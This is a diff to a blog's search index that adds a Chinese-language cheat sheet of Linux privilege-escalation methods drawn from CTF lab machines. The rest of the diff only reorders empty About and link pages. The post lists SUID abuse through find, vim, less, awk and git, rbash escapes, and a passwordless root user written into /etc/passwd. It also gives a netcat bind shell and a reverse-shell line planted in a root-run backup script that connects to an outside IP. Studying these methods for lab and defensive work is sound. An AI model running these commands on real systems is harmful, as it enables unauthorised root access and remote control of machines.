@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>Linux渗透提权姿势总结</title>
+      <link href="/Water-melon.github.io/2024/09/30/Linux%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
+      <url>/Water-melon.github.io/2024/09/30/Linux%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Linux渗透提权姿势总结"><a href="#Linux渗透提权姿势总结" class="headerlink" title="Linux渗透提权姿势总结"></a>Linux渗透提权姿势总结</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在做过不少Linux的靶机渗透后，几乎每一个靶机获取最后一个flag都是需要提权，在root权限下肆无忌惮查看所有文件。在实战中，一次成功的渗透往往也是以拿下最高权限作为完美的结尾，至此，我将打了多个靶机以来所用到的提权方式做一个总结，各位师傅若有补充，欢迎评论留言。</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><h2 id="SUID是什么？"><a href="#SUID是什么？" class="headerlink" title="SUID是什么？"></a>SUID是什么？</h2><p>SUID是Linux系统中的一个特殊权限，它允许文件在执行时，让调用者以文件拥有者的身份运行该文件。这意味着，当一个具有SUID权限的文件被执行时，它会授予调用者与文件拥有者相同的权限，使得调用者能够以文件拥有者的权限来执行文件中的命令和程序。在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效。</p><h2 id="SUID如何实现提权？"><a href="#SUID如何实现提权？" class="headerlink" title="SUID如何实现提权？"></a>SUID如何实现提权？</h2><p>举个例子吧，假设我们现在有一个可执行文件test，其属主为root用户，当我们通过非root用户登录时，如果test设置了SUID权限，我们可在非root用户下运行该二进制可执行文件，在执行文件时，该进程的权限将为root权限。以此得到权限提升。</p><p>为一个文件设置SUID权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename   #设置SUID位</span><br><span class="line"> </span><br><span class="line">chmod u-s filename   #去掉SUID设置</span><br></pre></td></tr></table></figure><p>这里有一个文件<br><img src="/Water-melon.github.io/2024/09/30/Linux%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/1.png" alt="1"><br>当没有SUID权限时，为drwxr-xr-x<br><img src="/Water-melon.github.io/2024/09/30/Linux%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/2.png" alt="2"><br>当拥有SUID权限时，为drwsr-xr-x</p><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p><p>利用find命令，找查具有SUID权限的可执行二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"> </span><br><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>一般有find，nmap，vim&#x2F;vi，bash，less，more，nano，cp，awk就可以进行下一步操作提权。<br><code>find: find / -name index.php -exec &quot;/bin/sh&quot;；#找什么文件不重要，只要有就可以</code></p><h2 id="find也可以用来弹shell"><a href="#find也可以用来弹shell" class="headerlink" title="find也可以用来弹shell"></a>find也可以用来弹shell</h2><h2 id="广播shell"><a href="#广播shell" class="headerlink" title="广播shell"></a>广播shell</h2><p>靶机：<br><code>find user -exec nc -lvp 4444 -e &#39;/bin/sh&#39; \;</code><br>攻击机：<br><code>nc 靶机ip 4444</code></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p>vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p><p>如：vim.tiny  &#x2F;etc&#x2F;passwd</p><p>也可以编写shell</p><p>vim.tiny</p><p>#vim命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:set shell = &#x27;/bin/sh&#x27;</span><br><span class="line"> </span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>用root身份打开一个新的bash shell</p><p>bash -p</p><p>bash-3.2# id</p><p>uid&#x3D;1002(service) gid&#x3D;1002(service) euid&#x3D;0(root) groups&#x3D;1002(service)</p><h2 id="less"><a href="#less" class="headerlink" title="less"></a>less</h2><p>less命令也可以进入shell</p><p>less &#x2F;etc&#x2F;passwd</p><p>#在less中输入:</p><p>!&#x2F;bin&#x2F;sh</p><h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用!命令进入shell</p><p>more &#x2F;etc&#x2F;passwd</p><p>#在more中输入:</p><p>!&#x2F;bin&#x2F;sh</p><h2 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h2><p>进入shell:</p><p>nano #进入nano编辑器</p><p>Ctrl + R</p><p>Ctrl + X</p><p>#即可输入命令</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><p>使用cp 命令覆盖原来的&#x2F;etc&#x2F;passwd文件</p><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>进入shell</p><p>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</p><h1 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h1><p>参考： <a href="https://blog.csdn.net/qq_43168364/article/details/111830233">https://blog.csdn.net/qq_43168364/article/details/111830233</a><br>rbash它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p><p>设置一个rbash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /bin/rbash # 复制一个bash，重命名为rbash</span><br><span class="line"> </span><br><span class="line">useradd -s /bin/rbash test # 设置用户test登陆的shell为rbash</span><br><span class="line"> </span><br><span class="line">mkdir -p /home/test/.bin # 在test用户下新建一个.bin目录存放可以执行的命令</span><br></pre></td></tr></table></figure><h2 id="set-shell"><a href="#set-shell" class="headerlink" title="set shell"></a>set shell</h2><p>即利用编辑器添加一个shell变量并执行</p><p>命令：<br><code>vi/vim</code><br>进入之后再输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh # 或者用/bin/bash</span><br><span class="line"> </span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>注意，在这之后还要添加环境变量。</p><p>给$PATH变量增加两个路径，用来查找命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line"> </span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure><p>成功案列可参考：<br>内网渗透：DC-2靶机</p><h2 id="自定义shell"><a href="#自定义shell" class="headerlink" title="自定义shell"></a>自定义shell</h2><p>利用bash_cmds自定义一个shell，以此达到提权的目的</p><p>命令：<br><code>BASH_CMDS[a]=/bin/sh;a </code><br>和set shell一样，这个也需要添加环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line"> </span><br><span class="line">export PATH=$PATH:/usr/bin&#125;</span><br></pre></td></tr></table></figure><p>成功案列可参考：<br>内网渗透：DC-2靶机</p><h2 id="Git提权"><a href="#Git提权" class="headerlink" title="Git提权"></a>Git提权</h2><p>注意：这里的git是拥有root权限的git，也就是sudo -l查找下的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash  #这里bash也可以换成sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line">!/bin/bash  #这里bash也可以换成sh</span><br></pre></td></tr></table></figure><h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>在了解teehee之前，我们先来了解一下&#x2F;etc&#x2F;passwd文件<br>参考：<a href="https://blog.csdn.net/liukaitydn/article/details/83046083">https://blog.csdn.net/liukaitydn/article/details/83046083</a><br>简而言之，就是存放用户的文件，可以通过修改该文件达到添加用户的效果，文件格式为</p><h3 id="注册名-口令-用户标识号-组标识号-用户名-用户主目录-命令解析程序"><a href="#注册名-口令-用户标识号-组标识号-用户名-用户主目录-命令解析程序" class="headerlink" title="[注册名]:[口令]:[用户标识号]:[组标识号]:[用户名]:[用户主目录]:[命令解析程序]"></a>[注册名]:[口令]:[用户标识号]:[组标识号]:[用户名]:[用户主目录]:[命令解析程序]</h3><p>口令为x即代表存放有密码，为空即代表没有密码，识标号为0代表root权限</p><p>因此写入：</p><p>echo “test::0:0:::&#x2F;bin&#x2F;bash” | sudo teehee -a &#x2F;etc&#x2F;passwd  </p><h3 id="就相当于添加了一个名叫test的无密码root权限用户"><a href="#就相当于添加了一个名叫test的无密码root权限用户" class="headerlink" title="就相当于添加了一个名叫test的无密码root权限用户"></a>就相当于添加了一个名叫test的无密码root权限用户</h3><h2 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h2><p>利用exp提权</p><p>searchsploit screen 4，找到对应版本漏洞进行攻击</p><h1 id="反弹root-shell"><a href="#反弹root-shell" class="headerlink" title="反弹root shell"></a>反弹root shell</h1><p>利用拥有root权限的文件<br><code>echo &quot;nc -e /bin/bash 192.168.120.129 5555&quot; &gt;&gt; /opt/scripts/backups.sh</code><br>若有错处，欢迎指正</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Shiro漏洞复现</title>
       <link href="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
       <url>/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
@@ -46,17 +59,6 @@
     
     
     <entry>
-      <title>关于作者</title>
-      <link href="/Water-melon.github.io/about/index.html"/>
-      <url>/Water-melon.github.io/about/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>friends</title>
       <link href="/Water-melon.github.io/friends/index.html"/>
       <url>/Water-melon.github.io/friends/index.html</url>
@@ -93,6 +95,17 @@
       <title>友情链接</title>
       <link href="/Water-melon.github.io/link/index.html"/>
       <url>/Water-melon.github.io/link/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于作者</title>
+      <link href="/Water-melon.github.io/about/index.html"/>
+      <url>/Water-melon.github.io/about/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
